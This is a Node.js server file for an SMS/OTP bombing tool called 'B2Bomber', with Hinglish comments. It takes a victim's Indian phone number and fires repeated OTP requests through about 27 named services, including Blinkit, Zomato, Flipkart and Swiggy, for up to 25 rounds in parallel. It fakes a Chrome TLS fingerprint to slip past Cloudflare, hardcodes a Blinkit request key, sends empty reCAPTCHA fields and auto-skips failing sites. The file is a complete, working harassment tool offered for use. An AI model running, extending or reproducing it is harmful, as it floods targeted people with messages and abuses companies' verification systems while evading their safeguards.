/* =====================================================================
 *  B2Bomber — server.js   (PURI FILE REPLACE KARO — index.html mat chhedo)
 *  ---------------------------------------------------------------------
 *  Stream format purana hi hai (id, name, status, ok, ms) — tumhara
 *  interface waisa hi chalega. Iske alawa har line me extra fields bhi
 *  ja rahe hain taaki UI me per-site "kitna gaya / kaun fail hua" dikhe.
 *
 *  Endpoints:
 *    GET  /api/services          -> saari sites + live stats
 *    GET  /api/stats             -> sirf stats (UI ke liye)
 *    GET  /api/bomb?phone=...    -> NDJSON live stream (EventSource/fetch)
 *    POST /api/bomb  {phone, rounds, services}
 *    GET  /api/health
 *
 *  package.json me: express (zaroori), impit (optional but Blinkit ke liye)
 * ===================================================================== */

'use strict';

const express = require('express');
const path    = require('path');

/* Chrome jaisa TLS fingerprint — Cloudflare wali sites ke liye. */
let Impit = null;
try { ({ Impit } = require('impit')); } catch (_) {}
const impit = Impit ? new Impit({ browser: 'chrome' }) : null;

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
         + '(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';

/* ------------------------------- CONFIG ------------------------------- */
const PORT        = process.env.PORT || 3000;
const TIMEOUT_MS  = Number(process.env.TIMEOUT_MS || 12000);
const CONC        = Number(process.env.CONC || 6);
const BENCH_AFTER = 3;
const BENCH_MS    = 10 * 60 * 1000;

/* ------------------------------ HELPERS ------------------------------- */
const FORM  = { 'Content-Type': 'application/x-www-form-urlencoded' };
const JSONH = { 'Content-Type': 'application/json' };
const qs    = (o) => new URLSearchParams(o).toString();

function hdr(origin, extra) {
  return {
    'User-Agent': UA,
    'Accept': '*/*',
    'Accept-Language': 'en-IN,en;q=0.9',
    'Origin': origin,
    'Referer': origin + '/',
    ...extra,
  };
}

function normalize(raw) {
  let d = String(raw || '').replace(/\D/g, '');
  if (d.length === 12 && d.startsWith('91')) d = d.slice(2);
  if (d.length === 11 && d.startsWith('0'))  d = d.slice(1);
  return { ten: d, cc: '91' + d, plus: '+91' + d };
}

async function request(url, opts = {}) {
  const { method = 'GET', headers = {}, body, redirect = 'follow' } = opts;
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), TIMEOUT_MS);
  try {
    if (impit) {
      const r = await impit.fetch(url, { method, headers, body, redirect, signal: ctrl.signal });
      return { status: r.status, ok: r.ok, text: await r.text() };
    }
    const r = await fetch(url, { method, headers, body, redirect, signal: ctrl.signal });
    return { status: r.status, ok: r.ok, text: await r.text() };
  } finally { clearTimeout(timer); }
}

async function tryAll(attempts) {
  let last = { status: 0, text: '', error: 'no attempt' };
  for (const a of attempts) {
    try {
      const r = await request(a.url, a);
      last = r;
      if (!benchWorthy(r.status)) return r;
    } catch (e) {
      last = { status: 0, text: '', error: String(e.message || e) };
    }
  }
  return last;
}

/* --------------------------- BENCH (auto-skip) ------------------------ */
const benchState = new Map();
const benchWorthy = (s) => s === 0 || s === 404 || s >= 500;
function markFail(id) {
  const b = benchState.get(id) || { fails: 0, until: 0 };
  b.fails++;
  if (b.fails >= BENCH_AFTER) b.until = Date.now() + BENCH_MS;
  benchState.set(id, b);
}
function markOk(id) { benchState.set(id, { fails: 0, until: 0 }); }
function isBenched(id) {
  const b = benchState.get(id);
  return !!(b && b.until > Date.now());
}

/* ---------------------- LIVE STATS (UI ke liye) ----------------------- */
// UI ye padh ke dikha sakta hai: kaunsi site se kitna gaya, kaun fail hua
const live = new Map();   // id -> { sent, ok, failed, lastStatus, lastMs, lastAt }
function L(id) {
  if (!live.has(id)) live.set(id, { sent: 0, ok: 0, failed: 0, lastStatus: null, lastMs: null, lastAt: null });
  return live.get(id);
}

/* =====================================================================
 *  SERVICES  —  naya add karna ho to neeche wala template copy karo:
 *
 *  { id:'merasite', name:'Mera Site',
 *    attempts: (p) => [
 *      { url:'https://merasite.com/api/otp', method:'POST',
 *        headers: hdr('https://merasite.com', FORM), body: qs({ mobile: p.ten }) },
 *    ] },
 * ===================================================================== */

const BLINKIT_REQ_KEY = 'c0e6868e-1180-400c-be51-f473479f1f0a';
let blinkitCache = { key: null, at: 0 };

async function blinkitAuth() {
  if (blinkitCache.key && Date.now() - blinkitCache.at < 25 * 60 * 1000) return blinkitCache.key;
  const r = await request('https://blinkit.com/v2/accounts/auth_key/', {
    headers: hdr('https://blinkit.com', { req_key: BLINKIT_REQ_KEY }),
  });
  let key = null;
  try { key = JSON.parse(r.text).auth_key; } catch (_) {}
  if (!key) throw new Error('blinkit auth_key nahi mila (status ' + r.status + ')');
  blinkitCache = { key, at: Date.now() };
  return key;
}

const SERVICES = [
  /* ------------------------- VERIFIED ------------------------- */
  { id: 'blinkit', name: 'Blinkit', verified: true,
    send: async (p, ctx) => {
      const key = ctx.blinkitKey || (ctx.blinkitKey = await blinkitAuth());
      return request('https://blinkit.com/v2/accounts/', {
        method: 'POST',
        headers: hdr('https://blinkit.com', { ...FORM, req_key: BLINKIT_REQ_KEY, auth_key: key, device_id: 'web' }),
        body: qs({ user_phone: p.plus }),
      });
    } },
  { id: 'nykaa', name: 'Nykaa', verified: true,
    attempts: (p) => [
      { url: 'https://www.nykaa.com/api/index.php/customer/send_otp', method: 'POST',
        headers: hdr('https://www.nykaa.com', FORM), body: qs({ mobile_number: p.ten, platform: 'web' }) },
      { url: 'https://www.nykaa.com/appapi/index.php/customer/send_otp', method: 'POST',
        headers: hdr('https://www.nykaa.com', FORM), body: qs({ mobile_number: p.ten, platform: 'web' }) },
    ] },
  { id: 'redbus', name: 'RedBus', verified: true,
    attempts: (p) => [
      { url: 'https://www.redbus.in/rpw/api/sendOtpV2', method: 'POST',
        headers: hdr('https://www.redbus.in', JSONH), body: JSON.stringify({ phone: p.ten, reCaptchaResponse: '' }) },
      { url: 'https://www.redbus.in/rpw/api/sendOtpV2', method: 'POST',
        headers: hdr('https://www.redbus.in', JSONH), body: JSON.stringify({ phone: p.cc, reCaptchaResponse: '' }) },
    ] },

  /* ------------------------ BEST EFFORT ------------------------ */
  { id: 'zomato', name: 'Zomato', attempts: (p) => [
      { url: 'https://www.zomato.com/php/otp.php', method: 'POST',
        headers: hdr('https://www.zomato.com', FORM), body: qs({ mobile_number: p.ten }) },
      { url: 'https://www.zomato.com/php/o2_api_v2/otp/send', method: 'POST',
        headers: hdr('https://www.zomato.com', FORM), body: qs({ mobile_number: p.ten }) } ] },
  { id: 'swiggy', name: 'Swiggy', attempts: (p) => [
      { url: 'https://www.swiggy.com/api/mobile-auth/otp', method: 'POST',
        headers: hdr('https://www.swiggy.com', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'myntra', name: 'Myntra', attempts: (p) => [
      { url: 'https://www.myntra.com/gateway/v2/user/otp/generate', method: 'POST',
        headers: hdr('https://www.myntra.com', FORM), body: qs({ mobile: p.ten }) } ] },
  { id: 'flipkart', name: 'Flipkart', attempts: (p) => [
      { url: 'https://www.flipkart.com/api/5/user/otp/generate', method: 'POST',
        headers: hdr('https://www.flipkart.com', JSONH), body: JSON.stringify({ phone: p.ten }) } ] },
  { id: 'snapdeal', name: 'Snapdeal', attempts: (p) => [
      { url: 'https://www.snapdeal.com/sendOTP', method: 'POST',
        headers: hdr('https://www.snapdeal.com', FORM), body: qs({ mobileNumber: p.ten }) },
      { url: 'https://www.snapdeal.com/sendOTP?' + qs({ mobileNumber: p.ten }), method: 'GET',
        headers: hdr('https://www.snapdeal.com') } ] },
  { id: 'mobikwik', name: 'MobiKwik', attempts: (p) => [
      { url: 'https://appapi.mobikwik.com/p/account/otp/cell', method: 'POST',
        headers: hdr('https://www.mobikwik.com', JSONH), body: JSON.stringify({ cell: p.cc }) } ] },
  { id: 'treebo', name: 'Treebo', attempts: (p) => [
      { url: 'https://www.treebo.com/api/v2/auth/login/otp/', method: 'POST',
        headers: hdr('https://www.treebo.com', JSONH), body: JSON.stringify({ phone: p.cc }) } ] },
  { id: 'goibibo', name: 'Goibibo', attempts: (p) => [
      { url: 'https://www.goibibo.com/common/downloadsms/?' + qs({ phone: p.ten, countryCode: '91' }),
        method: 'GET', headers: hdr('https://www.goibibo.com') } ] },
  { id: 'sulekha', name: 'Sulekha', attempts: (p) => [
      { url: 'https://myaccount.sulekha.com/network/userauthv1.aspx', method: 'POST',
        headers: hdr('https://myaccount.sulekha.com', FORM), body: qs({ mobile: p.ten }) } ] },
  { id: 'justdial', name: 'Justdial', attempts: (p) => [
      { url: 'https://www.justdial.com/functions/ajxandroid.php', method: 'POST',
        headers: hdr('https://www.justdial.com', FORM), body: qs({ mobile: p.ten }) } ] },
  { id: 'lenskart', name: 'Lenskart', attempts: (p) => [
      { url: 'https://www.lenskart.com/api/v1/send-otp', method: 'POST',
        headers: hdr('https://www.lenskart.com', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'oyo', name: 'OYO', attempts: (p) => [
      { url: 'https://www.oyorooms.com/api/v1/user/otp', method: 'POST',
        headers: hdr('https://www.oyorooms.com', JSONH), body: JSON.stringify({ phone: p.cc }) } ] },
  { id: 'bigbasket', name: 'BigBasket', attempts: (p) => [
      { url: 'https://www.bigbasket.com/api/v1/user/otp', method: 'POST',
        headers: hdr('https://www.bigbasket.com', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'pharmeasy', name: 'PharmEasy', attempts: (p) => [
      { url: 'https://pharmeasy.in/api/v1/otp/send', method: 'POST',
        headers: hdr('https://pharmeasy.in', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'vedantu', name: 'Vedantu', attempts: (p) => [
      { url: 'https://www.vedantu.com/api/v1/otp/send', method: 'POST',
        headers: hdr('https://www.vedantu.com', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'bewakoof', name: 'Bewakoof', attempts: (p) => [
      { url: 'https://www.bewakoof.com/api/v1/user/otp', method: 'POST',
        headers: hdr('https://www.bewakoof.com', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'purplle', name: 'Purplle', attempts: (p) => [
      { url: 'https://www.purplle.com/api/v1/sendOtp', method: 'POST',
        headers: hdr('https://www.purplle.com', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'makemytrip', name: 'MakeMyTrip', attempts: (p) => [
      { url: 'https://www.makemytrip.com/api/v1/otp/send', method: 'POST',
        headers: hdr('https://www.makemytrip.com', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'airtel', name: 'Airtel', attempts: (p) => [
      { url: 'https://www.airtel.in/api/v1/otp', method: 'POST',
        headers: hdr('https://www.airtel.in', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'cred', name: 'CRED', attempts: (p) => [
      { url: 'https://api.cred.com/otp/send', method: 'POST',
        headers: hdr('https://cred.club', JSONH), body: JSON.stringify({ phone: p.cc }) } ] },
  { id: 'zepto', name: 'Zepto', attempts: (p) => [
      { url: 'https://www.zeptonow.com/api/v1/otp/send', method: 'POST',
        headers: hdr('https://www.zeptonow.com', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'nykaafashion', name: 'Nykaa Fashion', attempts: (p) => [
      { url: 'https://www.nykaafashion.com/api/index.php/customer/send_otp', method: 'POST',
        headers: hdr('https://www.nykaafashion.com', FORM), body: qs({ mobile_number: p.ten }) } ] },
];

/* ============================== SERVER ================================ */
const app = express();
app.use(express.json({ limit: '256kb' }));
app.use(express.static(path.join(__dirname, 'public')));   // index.html as-is serve hoga

// UI ye call karke poori list + live counter dikha sakta hai
app.get('/api/services', (_req, res) => {
  res.json(SERVICES.map(s => ({
    id: s.id, name: s.name, verified: !!s.verified,
    benched: isBenched(s.id),
    ...L(s.id),
  })));
});

app.get('/api/stats', (_req, res) => {
  res.json(SERVICES.map(s => ({ id: s.id, name: s.name, ...L(s.id) })));
});

app.get('/api/health', (_req, res) => res.json({ ok: true, up: process.uptime() }));

/* ------------------------------- BOMB -------------------------------- */
async function bomb(req, res) {
  const src = Object.assign({}, req.query, req.body || {});
  const p = normalize(src.phone || src.number || '');
  if (!/^\d{10}$/.test(p.ten)) {
    return res.status(400).json({ error: 'Sahi 10-digit mobile number do' });
  }

  const rounds = Math.max(1, Math.min(parseInt(src.rounds || '1', 10) || 1, 25));
  const only   = src.services || src.only;
  let list = (!only || only === 'all')
    ? SERVICES.slice()
    : SERVICES.filter(s => String(only).split(',').includes(s.id));

  const skippedIds = list.filter(s => isBenched(s.id)).map(s => s.id);
  list = list.filter(s => !isBenched(s.id));

  res.setHeader('Content-Type', 'application/x-ndjson; charset=utf-8');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('X-Accel-Buffering', 'no');
  res.flushHeaders && res.flushHeaders();

  let closed = false;
  req.on('close', () => { closed = true; });
  const w = (o) => { if (!closed) res.write(JSON.stringify(o) + '\n'); };

  const total = list.length * rounds;
  w({ type: 'start', phone: p.ten, sites: list.length, rounds, total, skipped: skippedIds });

  const ctx = {};
  let done = 0, okTotal = 0, failTotal = 0;

  const runOne = async (svc, round) => {
    const t0 = Date.now();
    let status = 0, error = null;
    try {
      const r = svc.send ? await svc.send(p, ctx) : await tryAll(svc.attempts(p, ctx));
      status = r.status || 0;
      if (status === 0 && r.error) error = r.error;
      if (benchWorthy(status)) markFail(svc.id); else markOk(svc.id);
    } catch (e) {
      error = String(e.message || e);
      markFail(svc.id);
    }
    const ms = Date.now() - t0;
    const ok = status > 0 && status < 400;
    const s = L(svc.id);
    s.sent++; s.lastStatus = status; s.lastMs = ms; s.lastAt = Date.now();
    if (ok) { s.ok++; okTotal++; } else { s.failed++; failTotal++; }
    done++;

    // UI ye line padh ke per-site counter + status dikha sakta hai
    w({
      type: 'result',
      id: svc.id, name: svc.name,
      status, ok, ms, error, round,
      site: { sent: s.sent, ok: s.ok, failed: s.failed },
      done, total,
      progress: Math.round((done / total) * 100),
    });
  };

  let i = 0;
  const workers = Array.from({ length: Math.max(1, Math.min(CONC, list.length)) }, async () => {
    while (i < list.length && !closed) {
      const svc = list[i++];
      for (let r = 1; r <= rounds && !closed; r++) await runOne(svc, r);
    }
  });
  await Promise.all(workers);

  w({
    type: 'summary',
    sent: done, ok: okTotal, failed: failTotal, skipped: skippedIds,
    sites: SERVICES.map(s => ({ id: s.id, name: s.name, benched: isBenched(s.id), ...L(s.id) })),
  });
  if (!closed) res.end();
}

app.get('/api/bomb', bomb);
app.post('/api/bomb', bomb);

app.listen(PORT, () => {
  console.log('B2Bomber live -> http://localhost:' + PORT + '  |  sites: ' + SERVICES.length);
});
